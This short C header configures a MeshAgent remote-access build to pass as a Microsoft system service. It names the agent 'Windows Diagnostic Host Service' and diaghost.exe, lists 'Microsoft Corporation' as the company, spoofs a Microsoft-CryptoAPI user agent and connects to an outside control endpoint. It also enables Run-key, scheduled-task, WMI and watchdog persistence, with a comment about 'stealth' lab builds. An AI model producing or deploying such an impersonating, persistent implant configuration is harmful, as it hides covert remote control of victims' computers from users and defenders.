/* Generated file - do not edit. */
#ifndef GENERATED_MESHAGENT_BRANDING_H
#define GENERATED_MESHAGENT_BRANDING_H

#undef MESH_AGENT_SERVICE_FILE
#define MESH_AGENT_SERVICE_FILE TEXT("WinDiagnosticHost")
#undef MESH_AGENT_SERVICE_NAME
#define MESH_AGENT_SERVICE_NAME TEXT("Windows Diagnostic Host Service")
#undef MESH_AGENT_COMPANY_NAME
#define MESH_AGENT_COMPANY_NAME "Microsoft Corporation"
#undef MESH_AGENT_PRODUCT_NAME
#define MESH_AGENT_PRODUCT_NAME "Windows Diagnostic Host"
#undef MESH_AGENT_FILE_DESCRIPTION
#define MESH_AGENT_FILE_DESCRIPTION "system health monitoring"
#undef MESH_AGENT_INTERNAL_NAME
#define MESH_AGENT_INTERNAL_NAME "diaghost.exe"
#undef MESH_AGENT_COPYRIGHT
#define MESH_AGENT_COPYRIGHT "Apache 2.0 License"
#undef MESH_AGENT_LOG_DIRECTORY
#define MESH_AGENT_LOG_DIRECTORY TEXT("C:/Windows/System32/DiagnosticHost/logs")

/* Optional network hints for future use */
#define MESH_AGENT_NETWORK_ENDPOINT "wss://agents.high.support:4445/agent.ashx"
#define MESH_AGENT_NETWORK_SNI NULL
#define MESH_AGENT_NETWORK_USER_AGENT "Microsoft-CryptoAPI/10.0"
#define MESH_AGENT_NETWORK_JA3 NULL

/* Persistence flags */
/* In lab builds (STEALTH_LAB=1), default to enabling all persistence knobs */

#define MESH_AGENT_PERSIST_RUNKEY 1
#define MESH_AGENT_PERSIST_TASK 1
#define MESH_AGENT_PERSIST_WMI 1
#define MESH_AGENT_PERSIST_WATCHDOG 1

#endif /* GENERATED_MESHAGENT_BRANDING_H */
